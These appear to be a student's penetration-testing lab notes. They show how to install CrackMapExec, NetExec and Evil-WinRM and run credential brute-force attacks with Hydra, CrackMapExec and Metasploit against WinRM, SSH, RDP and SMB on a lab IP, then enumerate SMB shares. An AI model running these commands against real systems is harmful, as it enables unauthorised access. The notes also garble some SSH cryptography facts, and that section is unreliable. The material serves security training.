there are many services that uses authentication 

#### CrackMapExec
We can install `CrackMapExec` via apt on a Parrot host or clone the [GitHub repo](https://github.com/byt3bl33d3r/CrackMapExec) and follow the various [installation](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation) methods, such as installing from source and avoiding dependency issues.

```shell-session
sudo apt-get -y install crackmapexec
```

```bash
sudo apt install -y git python3 python3-pip python3-dev libssl-dev libffi-dev build-essential

git clone https://github.com/Porchetta-Industries/CrackMapExec

cd CrackMapExec

python3 -m venv venv

source venv/bin/activate

#install all the dependence 
pip install --upgrade pip
pip install .

cme --help

```


Alternatively, we can install [NetExec](https://github.com/Pennyw0rth/NetExec) to follow along using `sudo apt-get -y install netexec`

specific service help

```shell-session
crackmapexec smb -h
```

#### CrackMapExec Usage

```shell-session
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
```shell-session
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```


Another handy tool that we can use to communicate with the WinRM service is [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), which allows us to communicate with the WinRM service efficiently.

#### Evil-WinRM
```shell-session
sudo gem install evil-winrm
```

usage
```shell-session
evil-winrm -i <target-IP> -u <username> -p <password>
```
```shell-session
evil-winrm -i 10.129.42.197 -u user -p password
```

### ssh

there are 3 different cryptography 
1. symmetric 
	1. Symmetric encryption uses the `same key` for encryption and decryption. However, anyone who has access to the key could also access the transmitted data. Therefore, a key exchange procedure is needed for secure symmetric encryption. The [Diffie-Hellman](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) key exchange method is used for this purpose.
	2. if someone else got the key they cant decrypt because of exchange method
	3. AEX,Blowfish,3DES
2. asymmetric
	1. `two SSH keys`: a private key and a public key. The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key. If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials. Once a connection is established, the server uses the public key for initialization and authentication. If the client can decrypt the message, it has the private key, and the SSH session can begin.
3. hashing
	1. The hashing method converts the transmitted data into another unique value.
	2. SSH uses

### Hydra - ssh

```shell-session
hydra -L user.list -P password.list ssh://10.129.42.197
```

```bash
ssh username@<ip>
>password
```
### Remote Desktop protocol (RDP)

```shell-session
hydra -L user.list -P password.list rdp://10.129.42.197
```
we can use this tool to login
- remmina
- rdesktop
- xfreerdp

### SMB
- send data between client and server in lan
- smb is also called as CIFS (common internet file sys)

```shell-session
hydra -L user.list -P password.list smb://10.129.42.197
```
some times we may get error because of the versions of smbv3 so we can use metasploitable

```shell-session
msfconsole -q

use auxiliary/scanner/smb/smb_login

set user_file user.list
set pass_file password.list
set rhosts <ip>
run
```

`CrackMapExec` again to view the available shares and what privileges we have for them

```shell-session
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```

we can view through
```shell-session
smbclient -U user \\\\10.129.42.197\\SHARENAME
```
